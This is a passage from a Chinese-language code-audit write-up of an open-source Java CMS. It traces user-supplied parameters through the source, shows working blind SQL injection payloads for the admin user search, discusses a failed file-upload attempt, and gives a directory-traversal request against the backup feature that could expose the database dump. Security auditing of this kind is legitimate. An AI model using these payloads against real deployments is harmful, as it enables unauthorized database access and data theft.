+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>gId</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>!</span><span class=s>&#34;&#34;</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>gId</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>hql</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=s>&#34;and u.id in (select ug.user.id from UserGroup ug where ug.group.id=&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>gId</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;)&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>rId</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>!</span><span class=s>&#34;&#34;</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>rId</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>hql</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=s>&#34;and u.id in (select ur.user.id from UserRole ur where ur.role.id=&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>rId</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;)&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>find</span><span class=p>(</span><span class=n>hql</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 分析代码我发现，该处存在多个参数存在动态拼接。向下追溯后find方法，未发现任何过滤，所以我们，直接向上追溯</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=nd>@ResponseBody</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=nd>@RequestMapping</span><span class=p>(</span><span class=s>&#34;/list&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=nf>list</span><span class=p>(</span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>req</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>gId</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>req</span><span class=p>.</span><span class=na>getParameter</span><span class=p>(</span><span class=s>&#34;gId&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>rId</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>req</span><span class=p>.</span><span class=na>getParameter</span><span class=p>(</span><span class=s>&#34;rId&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>searchCode</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>req</span><span class=p>.</span><span class=na>getParameter</span><span class=p>(</span><span class=s>&#34;searchCode&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>searchValue</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>req</span><span class=p>.</span><span class=na>getParameter</span><span class=p>(</span><span class=s>&#34;searchValue&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=n>DataTableMap</span><span class=p>.</span><span class=na>getMapData</span><span class=p>(</span><span class=n>userService</span><span class=p>.</span><span class=na>findUser</span><span class=p>(</span><span class=n>gId</span><span class=p>,</span><span class=n>rId</span><span class=p>,</span><span class=n>searchCode</span><span class=p>,</span><span class=w> </span><span class=n>searchValue</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 仅发现这一个路由调用了该方法。从SQL语句中我们可知，有三个变量使用了动态拼接，分别是：searchValue、gId和rId</p><p>​ 我们前往前端定位功能点。发现这是管理员后台的用户管理功能。那么我们开始测试：</p><h6 id=searchvalue>searchValue</h6><p>​ 根据功能点我们来到用户管理的搜索功能，尝试搜索后抓包，抓得如下数据包：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/admin/user/list.do?draw=2&amp;columns%5B0%5D%5Bdata%5D=id&amp;columns%5B0%5D%5Bname%5D=&amp;columns%5B0%5D%5Bsearchable%5D=true&amp;columns%5B0%5D%5Borderable%5D=false&amp;columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B1%5D%5Bdata%5D=id&amp;columns%5B1%5D%5Bname%5D=&amp;columns%5B1%5D%5Bsearchable%5D=true&amp;columns%5B1%5D%5Borderable%5D=false&amp;columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B2%5D%5Bdata%5D=username&amp;columns%5B2%5D%5Bname%5D=&amp;columns%5B2%5D%5Bsearchable%5D=true&amp;columns%5B2%5D%5Borderable%5D=false&amp;columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B3%5D%5Bdata%5D=nickname&amp;columns%5B3%5D%5Bname%5D=&amp;columns%5B3%5D%5Bsearchable%5D=true&amp;columns%5B3%5D%5Borderable%5D=false&amp;columns%5B3%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B3%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B4%5D%5Bdata%5D=status&amp;columns%5B4%5D%5Bname%5D=&amp;columns%5B4%5D%5Bsearchable%5D=true&amp;columns%5B4%5D%5Borderable%5D=false&amp;columns%5B4%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B4%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B5%5D%5Bdata%5D=email&amp;columns%5B5%5D%5Bname%5D=&amp;columns%5B5%5D%5Bsearchable%5D=true&amp;columns%5B5%5D%5Borderable%5D=false&amp;columns%5B5%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B5%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B6%5D%5Bdata%5D=phone&amp;columns%5B6%5D%5Bname%5D=&amp;columns%5B6%5D%5Bsearchable%5D=true&amp;columns%5B6%5D%5Borderable%5D=false&amp;columns%5B6%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B6%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B7%5D%5Bdata%5D=createDate&amp;columns%5B7%5D%5Bname%5D=&amp;columns%5B7%5D%5Bsearchable%5D=true&amp;columns%5B7%5D%5Borderable%5D=false&amp;columns%5B7%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B7%5D%5Bsearch%5D%5Bregex%5D=false&amp;start=0&amp;length=15&amp;search%5Bvalue%5D=&amp;search%5Bregex%5D=false&amp;searchCode=id&amp;searchValue=&amp;_=1732691822696</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>172.21.55.165:8888</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>application/json, text/javascript, */*; q=0.01</span>
+</span></span><span class=line><span class=cl><span class=n>X-Requested-With</span><span class=o>:</span> <span class=l>XMLHttpRequest</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://172.21.55.165:8888/admin</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
+</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>JSESSIONID=5EA494FF429C210478C61A1E2BA26079; collapase-nav=collapse-nav</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ GET参数中的searchValue则是可尝试的注入点：</p><p>​ 尝试输入单引号，报错，尝试够高SQL语句，得到payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; and id like (case when ascii(substr(database(),1,1))=1 then &#39;</span><span class=mi>1</span><span class=s1>&#39; else &#39;</span><span class=o>%</span><span class=s1>&#39; end) and id like &#39;</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 注入方式与前面的SQL注入方式相同，不做赘述。</p><h6 id=gidrid>gId、rId</h6><p>​ 在GET传参中加上一个gId或者rId即可，payload如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>2</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=k>like</span><span class=w> </span><span class=p>(</span><span class=k>case</span><span class=w> </span><span class=k>when</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=n>substr</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>1</span><span class=w> </span><span class=k>then</span><span class=w> </span><span class=s1>&#39;1&#39;</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=s1>&#39;%&#39;</span><span class=w> </span><span class=k>end</span><span class=p>)</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><h3 id=任意文件操控读取修改等>任意文件操控（读取，修改等）</h3><h4 id=srcmainjavatechwetechcmscontrollertopiccontrollerjava失败>src/main/java/tech/wetech/cms/controller/TopicController.java(失败)</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=nd>@ResponseBody</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=nd>@RequestMapping</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;/indexPic/add&#34;</span><span class=p>,</span><span class=w> </span><span class=n>method</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>RequestMethod</span><span class=p>.</span><span class=na>POST</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=n>ResponseData</span><span class=w> </span><span class=nf>add</span><span class=p>(</span><span class=nd>@Validated</span><span class=w> </span><span class=n>IndexPic</span><span class=w> </span><span class=n>indexPic</span><span class=p>,</span><span class=w> </span><span class=n>HttpSession</span><span class=w> </span><span class=n>session</span><span class=p>,</span><span class=w> </span><span class=n>BindingResult</span><span class=w> </span><span class=n>br</span><span class=p>,</span><span class=w> </span><span class=n>MultipartFile</span><span class=w> </span><span class=n>image</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>br</span><span class=p>.</span><span class=na>hasFieldErrors</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>return</span><span class=w> </span><span class=n>ResponseData</span><span class=p>.</span><span class=na>FAILED_NO_DATA</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=c1>// 处理图片流数据</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>realPath</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>session</span><span class=p>.</span><span class=na>getServletContext</span><span class=p>().</span><span class=na>getRealPath</span><span class=p>(</span><span class=s>&#34;&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>oldName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>image</span><span class=p>.</span><span class=na>getOriginalFilename</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>newName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Date</span><span class=p>().</span><span class=na>getTime</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;.&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>FilenameUtils</span><span class=p>.</span><span class=na>getExtension</span><span class=p>(</span><span class=n>oldName</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=c1>// 对图片流进行压缩，生成文件和缩略图保存到指定文件夹</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>writeIndexPic</span><span class=p>(</span><span class=n>realPath</span><span class=p>,</span><span class=w> </span><span class=n>newName</span><span class=p>,</span><span class=w> </span><span class=n>image</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>return</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ResponseData</span><span class=p>(</span><span class=kc>false</span><span class=p>,</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=na>getMessage</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>indexPic</span><span class=p>.</span><span class=na>setOldName</span><span class=p>(</span><span class=n>oldName</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>indexPic</span><span class=p>.</span><span class=na>setNewName</span><span class=p>(</span><span class=n>newName</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>indexPicService</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>indexPic</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>indexPic</span><span class=p>.</span><span class=na>getStatus</span><span class=p>()</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>indexService</span><span class=p>.</span><span class=na>generateBody</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=n>ResponseData</span><span class=p>.</span><span class=na>SUCCESS_NO_DATA</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 经过审计，该功能点并没有进行过滤，因此理论上该功能点存在任意文件上传漏洞，且该项目解析JSP，可以Getshell，但是测试时发现由于项目过于老旧，一旦进行抓包getInputStream方法就会报错，于是放弃测试该功能点。</p><p>​ edit功能点也是同样的原因</p><h3 id=目录穿透>目录穿透</h3><h4 id=srcmainjavatechwetechbasicutilmysqlutiljava成功>src/main/java/tech/wetech/basic/util/MySQLUtil.java(成功)</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>backup</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>BufferedReader</span><span class=w> </span><span class=n>br</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>BufferedWriter</span><span class=w> </span><span class=n>bw</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;cmd /c mysqldump -u&#34;</span><span class=o>+</span><span class=n>username</span><span class=o>+</span><span class=s>&#34; -p&#34;</span><span class=o>+</span><span class=n>password</span><span class=o>+</span><span class=s>&#34; &#34;</span><span class=o>+</span><span class=n>database</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>Process</span><span class=w> </span><span class=n>proc</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>br</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>InputStreamReader</span><span class=p>(</span><span class=n>proc</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>()));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>bw</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BufferedWriter</span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>					</span><span class=k>new</span><span class=w> </span><span class=n>FileWriter</span><span class=p>(</span><span class=n>backupDir</span><span class=o>+</span><span class=n>File</span><span class=p>.</span><span class=na>separator</span><span class=o>+</span><span class=n>filename</span><span class=o>+</span><span class=s>&#34;.sql&#34;</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>backupDir</span><span class=o>+</span><span class=n>File</span><span class=p>.</span><span class=na>separator</span><span class=o>+</span><span class=n>filename</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>while</span><span class=p>((</span><span class=n>str</span><span class=o>=</span><span class=n>br</span><span class=p>.</span><span class=na>readLine</span><span class=p>())</span><span class=o>!=</span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=n>bw</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>str</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=n>bw</span><span class=p>.</span><span class=na>newLine</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w> </span><span class=k>finally</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=k>if</span><span class=p>(</span><span class=n>br</span><span class=o>!=</span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=n>br</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=k>if</span><span class=p>(</span><span class=n>bw</span><span class=o>!=</span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=n>bw</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 在寻找命令执行漏洞的过程中我发现，该功能再创建压缩包时存在目录穿透漏洞，我们向上追溯时发现，对于传入的参数filename并没有进行过滤，所以可以在任意位置创建一个压缩包文件，甚至可以传到upload文件夹下通过URL访问直接下载下来，实现脱库。</p><p>​ payload如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/admin/backup/add.do</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>172.21.55.165:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>38</span>
+</span></span><span class=line><span class=cl><span class=n>X-Requested-With</span><span class=o>:</span> <span class=l>XMLHttpRequest</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>application/json, text/javascript, */*; q=0.01</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded; charset=UTF-8</span>
+</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://172.21.55.165:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://172.21.55.165:8888/admin</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
